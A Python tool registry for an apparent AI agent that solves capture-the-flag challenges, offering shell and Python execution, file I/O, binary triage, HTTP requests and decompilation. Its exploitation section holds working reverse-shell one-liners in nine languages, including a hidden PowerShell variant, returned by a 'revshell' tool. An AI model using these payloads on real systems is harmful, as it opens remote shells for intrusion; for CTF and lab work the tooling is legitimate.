"""Tool registry — Phase 5: full CTF tool set with streaming support.

Each entry: {"fn": callable, "description": str, "schema": str}
The schema is injected verbatim into the system prompt tool catalog.

Execution model
---------------
- run_shell / python_exec  : arbitrary execution — go through the approval gate in loop.py
- write_file               : always shows diff + prompts, even under --approve auto
- read_file / list_dir / file_info / hexdump / strings / decompile : read-only, auto-approved
- http_request             : network I/O, goes through the gate
- finish                   : terminal action, no gate
"""
import binascii, hashlib, os, socket, subprocess, sys, threading, time, urllib.request, urllib.error
from typing import Any, Callable

_registry: dict[str, dict] = {}


def _tool(name: str, description: str, schema: str):
    def decorator(fn):
        _registry[name] = {"fn": fn, "description": description, "schema": schema}
        return fn
    return decorator


# ── Execution tools ────────────────────────────────────────────────────────────

@_tool(
    "run_shell",
    "Run a shell command; returns stdout+stderr.",
    '{"thought":"<reason>","tool":"run_shell","args":{"cmd":"<shell command>"}}',
)
def run_shell(cmd: str, timeout: int = 30, cwd: str | None = None,
              _stream_to: Callable[[str], None] | None = None):
    t0    = time.monotonic()
    lines: list[str] = []

    try:
        proc = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, cwd=cwd,
        )

        def _reader():
            for line in iter(proc.stdout.readline, ""):
                lines.append(line)
                if _stream_to:
                    _stream_to(line)

        t = threading.Thread(target=_reader, daemon=True)
        t.start()
        t.join(timeout=timeout)

        if t.is_alive():
            proc.kill()
            t.join(1)
            return f"[timed out after {timeout}s]\n" + "".join(lines), float(timeout)

        proc.wait()
        return "".join(lines).strip() or "(no output)", time.monotonic() - t0

    except Exception as e:
        return f"[run_shell error] {e}", time.monotonic() - t0


@_tool(
    "python_exec",
    "Run a Python 3 snippet; ideal for pwntools/pycryptodome/sympy/z3 one-liners.",
    '{"thought":"<reason>","tool":"python_exec","args":{"code":"import base64; print(base64.b64decode(\'aGVsbG8=\'))"}}',
)
def python_exec(code: str, timeout: int = 30,
                _stream_to: Callable[[str], None] | None = None):
    t0    = time.monotonic()
    lines: list[str] = []

    try:
        proc = subprocess.Popen(
            [sys.executable, "-c", code],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True,
        )

        def _reader():
            for line in iter(proc.stdout.readline, ""):
                lines.append(line)
                if _stream_to:
                    _stream_to(line)

        t = threading.Thread(target=_reader, daemon=True)
        t.start()
        t.join(timeout=timeout)

        if t.is_alive():
            proc.kill()
            t.join(1)
            return f"[timed out after {timeout}s]\n" + "".join(lines), float(timeout)

        proc.wait()
        return "".join(lines).strip() or "(no output)", time.monotonic() - t0

    except Exception as e:
        return f"[python_exec error] {e}", time.monotonic() - t0


# ── File I/O ───────────────────────────────────────────────────────────────────

_READ_LIMIT = 8 * 1024   # 8 KB


@_tool(
    "read_file",
    f"Read a text file (up to {_READ_LIMIT // 1024} KB). Use hexdump for binaries.",
    '{"thought":"<reason>","tool":"read_file","args":{"path":"./flag.txt"}}',
)
def read_file(path: str):
    t0 = time.monotonic()
    try:
        size = os.path.getsize(path)
        with open(path, "r", errors="replace") as f:
            content = f.read(_READ_LIMIT)
        suffix = f"\n[... file is {size} bytes; truncated to {_READ_LIMIT} bytes]" if size > _READ_LIMIT else ""
        return content + suffix, time.monotonic() - t0
    except OSError as e:
        return f"[read_file error] {e}", 0.0


@_tool(
    "write_file",
    "Write text to a file. Always shows a diff and asks for confirmation.",
    '{"thought":"<reason>","tool":"write_file","args":{"path":"./exploit.py","text":"#!/usr/bin/env python3\\n..."}}',
)
def write_file(path: str, text: str):
    # Approval (diff + prompt) is handled by loop._gate before this runs.
    t0 = time.monotonic()
    try:
        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        with open(path, "w") as f:
            f.write(text)
        return f"[wrote {len(text)} bytes to {path}]", time.monotonic() - t0
    except OSError as e:
        return f"[write_file error] {e}", 0.0


# ── Directory listing ──────────────────────────────────────────────────────────

@_tool(
    "list_dir",
    "List a directory (name, type, size).",
    '{"thought":"<reason>","tool":"list_dir","args":{"path":"."}}',
)
def list_dir(path: str = "."):
    t0 = time.monotonic()
    try:
        entries = sorted(os.scandir(path), key=lambda e: (not e.is_dir(), e.name))
        lines = []
        for e in entries:
            try:
                size = e.stat().st_size
                kind = "DIR" if e.is_dir() else f"{size:>10} B"
            except OSError:
                kind = "?"
            lines.append(f"{'d' if e.is_dir() else '-'}  {kind:>12}  {e.name}")
        return "\n".join(lines) or "(empty)", time.monotonic() - t0
    except OSError as e:
        return f"[list_dir error] {e}", 0.0


# ── Binary triage ──────────────────────────────────────────────────────────────

@_tool(
    "file_info",
    "Report file type (via `file`), size, and SHA-256 hash.",
    '{"thought":"<reason>","tool":"file_info","args":{"path":"./chal"}}',
)
def file_info(path: str):
    t0 = time.monotonic()
    try:
        stat  = os.stat(path)
        sha   = hashlib.sha256(open(path, "rb").read()).hexdigest()
        ftype = subprocess.run(
            ["file", path], capture_output=True, text=True
        ).stdout.strip()
        result = f"{ftype}\nsize:   {stat.st_size} bytes\nsha256: {sha}"
        return result, time.monotonic() - t0
    except OSError as e:
        return f"[file_info error] {e}", 0.0


@_tool(
    "hexdump",
    "Hex+ASCII dump of the first n bytes of a file (default 256).",
    '{"thought":"<reason>","tool":"hexdump","args":{"path":"./chal","n":256}}',
)
def hexdump(path: str, n: int = 256):
    t0 = time.monotonic()
    try:
        raw = open(path, "rb").read(n)
        lines = []
        for i in range(0, len(raw), 16):
            chunk = raw[i : i + 16]
            hex_  = " ".join(f"{b:02x}" for b in chunk)
            asc   = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
            lines.append(f"{i:08x}  {hex_:<47}  |{asc}|")
        out = "\n".join(lines) or "(empty file)"
        suffix = f"\n[showing first {n} of {os.path.getsize(path)} bytes]" if os.path.getsize(path) > n else ""
        return out + suffix, time.monotonic() - t0
    except OSError as e:
        return f"[hexdump error] {e}", 0.0


@_tool(
    "strings",
    "Extract printable strings from a file (default min length 4).",
    '{"thought":"<reason>","tool":"strings","args":{"path":"./chal","min_len":4}}',
)
def strings(path: str, min_len: int = 4):
    t0 = time.monotonic()
    import re as _re

    def _py_strings(data: bytes) -> str:
        found = _re.findall(rb"[ -~]{" + str(min_len).encode() + rb",}", data)
        return b"\n".join(found).decode(errors="replace")

    try:
        proc = subprocess.run(
            ["strings", f"-n{min_len}", path],
            capture_output=True, text=True, timeout=30,
        )
        out = proc.stdout.strip()
        if out:
            return out, time.monotonic() - t0
        # macOS strings only scans Mach-O segments — fall back to pure Python
        raw = open(path, "rb").read()
        return _py_strings(raw) or "(no strings found)", time.monotonic() - t0
    except FileNotFoundError:
        raw = open(path, "rb").read()
        return _py_strings(raw) or "(no strings found)", time.monotonic() - t0
    except subprocess.TimeoutExpired:
        return "[timed out]", 30.0


# ── Network ────────────────────────────────────────────────────────────────────

@_tool(
    "http_request",
    "Make an HTTP request. Useful for web challenges.",
    '{"thought":"<reason>","tool":"http_request","args":{"method":"GET","url":"http://10.10.10.10/flag","headers":{},"body":null}}',
)
def http_request(
    method: str,
    url: str,
    headers: dict[str, str] | None = None,
    body: str | None = None,
    timeout: int = 15,
):
    t0 = time.monotonic()
    try:
        data = body.encode() if body else None
        req  = urllib.request.Request(url, data=data, headers=headers or {}, method=method.upper())
        with urllib.request.urlopen(req, timeout=timeout) as r:
            status  = r.status
            rbody   = r.read(8192).decode(errors="replace")
            rhdrs   = dict(r.headers)
        out = f"HTTP {status}\n"
        out += "\n".join(f"{k}: {v}" for k, v in rhdrs.items()) + "\n\n"
        out += rbody
        return out, time.monotonic() - t0
    except urllib.error.HTTPError as e:
        return f"HTTP {e.code} {e.reason}\n{e.read(2048).decode(errors='replace')}", time.monotonic() - t0
    except Exception as e:
        return f"[http_request error] {e}", 0.0


# ── Exploitation ─────────────────────────────────────────────────────────────

# Reverse-shell one-liner templates (subset of ctf-rev; inert string generation).
# {ip}/{port} are substituted with str.replace (NOT .format) so the literal { } in the
# perl/powershell payloads survive untouched.
_REVSHELLS = {
    "bash":    "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "sh":      "sh -i >& /dev/tcp/{ip}/{port} 0>&1",
    "nc-mkfifo": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "nc-e":    "nc -e /bin/sh {ip} {port}",
    "python3": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
               "[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
    "php":     "php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl":    "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,"
               "getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
               "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'",
    "socat":   "socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
    "powershell": "powershell -nop -W hidden -c \"$c=New-Object System.Net.Sockets.TCPClient("
                  "'{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,"
                  "$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                  "$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS> ');"
                  "$s.Write($sb,0,$sb.Length);$s.Flush()}\"",
}


@_tool(
    "revshell",
    "Generate a reverse-shell one-liner (bash/sh/nc-mkfifo/nc-e/python3/php/perl/socat/powershell). "
    "Inert string generation — does NOT connect. Catch it with `ctf-rev listen <port>`.",
    '{"thought":"<reason>","tool":"revshell","args":{"shell":"bash","lhost":"10.10.14.3","lport":4444}}',
)
def revshell(shell: str = "bash", lhost: str = "", lport: int = 4444):
    t0 = time.monotonic()
    if shell not in _REVSHELLS:
        return f"[revshell] unknown shell {shell!r}; try: {', '.join(_REVSHELLS)}", time.monotonic() - t0
    if not lhost:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)); lhost = s.getsockname()[0]; s.close()
        except OSError:
            lhost = "127.0.0.1"
    payload = _REVSHELLS[shell].replace("{ip}", lhost).replace("{port}", str(lport))
    return (f"{payload}\n\n# catch it:  ctf-rev listen {lport}   (LHOST={lhost})",
            time.monotonic() - t0)


# ── Terminal ───────────────────────────────────────────────────────────────────

@_tool(
    "finish",
    "End the loop with a final answer or flag.",
    '{"thought":"<summary>","tool":"finish","args":{"answer":"<flag or result>"}}',
)
def finish(answer: str):
    return answer, 0.0


@_tool(
    "decompile",
    "Decompile a native binary (ELF/PE/Mach-O) to C pseudocode via Ghidra headless "
    "(radare2 fallback). Own long timeout (minutes), unlike the 30s run_shell cap.",
    '{"thought":"<reason>","tool":"decompile","args":{"path":"./chal","func":"main"}}',
)
def decompile(path: str, func: str | None = None, timeout: int = 300):
    t0 = time.monotonic()
    import shutil, tempfile
    ghidra_home = os.environ.get("GHIDRA_HOME", "/usr/share/ghidra")
    headless = os.path.join(ghidra_home, "support", "analyzeHeadless")
    if not os.path.isfile(headless):
        headless = shutil.which("analyzeHeadless")
    script = os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        "scripts", "ghidra_decompile.java")
    if headless and os.path.isfile(script):
        proj = tempfile.mkdtemp(prefix="ctf-ghidra.")
        outf = os.path.join(proj, "decompiled.txt")
        try:
            subprocess.run(
                [headless, proj, "tmp", "-import", path,
                 "-scriptPath", os.path.dirname(script),
                 "-postScript", os.path.basename(script), outf,
                 "-deleteProject"],
                capture_output=True, text=True, timeout=timeout,
            )
            if os.path.isfile(outf) and os.path.getsize(outf) > 0:
                text = open(outf, encoding="utf-8", errors="replace").read()
                if func:
                    marker = f"==== {func} "
                    idx = text.find(marker)
                    if idx != -1:
                        nxt = text.find("\n// ====", idx + 1)
                        text = text[idx:] if nxt == -1 else text[idx:nxt]
                return text[:20000], time.monotonic() - t0
        except subprocess.TimeoutExpired:
            pass
        finally:
            shutil.rmtree(proj, ignore_errors=True)
    r2 = shutil.which("r2") or shutil.which("radare2")
    if r2:
        seek = func or "main"
        try:
            proc = subprocess.run(
                [r2, "-e", "scr.color=0", "-qc", f"aaa; s {seek}; pdg || pdc", path],
                capture_output=True, text=True, timeout=min(timeout, 180),
            )
            if proc.stdout.strip():
                return proc.stdout.strip()[:20000], time.monotonic() - t0
        except subprocess.TimeoutExpired:
            return "[decompile: radare2 timed out]", time.monotonic() - t0
    return "[decompile: no Ghidra headless or radare2 available]", time.monotonic() - t0


# ── Registry helpers ───────────────────────────────────────────────────────────

def catalog() -> str:
    lines = []
    for name, meta in _registry.items():
        lines.append(f"  {name}: {meta['description']}")
        lines.append(f"    example: {meta['schema']}")
    return "\n".join(lines)


_STREAMING_TOOLS = frozenset({"run_shell", "python_exec"})


def dispatch(
    name: str,
    args: dict,
    stream_to: Callable[[str], None] | None = None,
) -> tuple[Any, float]:
    if name not in _registry:
        raise KeyError(f"unknown tool: {name!r}")
    fn = _registry[name]["fn"]
    if stream_to and name in _STREAMING_TOOLS:
        return fn(**args, _stream_to=stream_to)
    return fn(**args)


def known(name: str) -> bool:
    return name in _registry
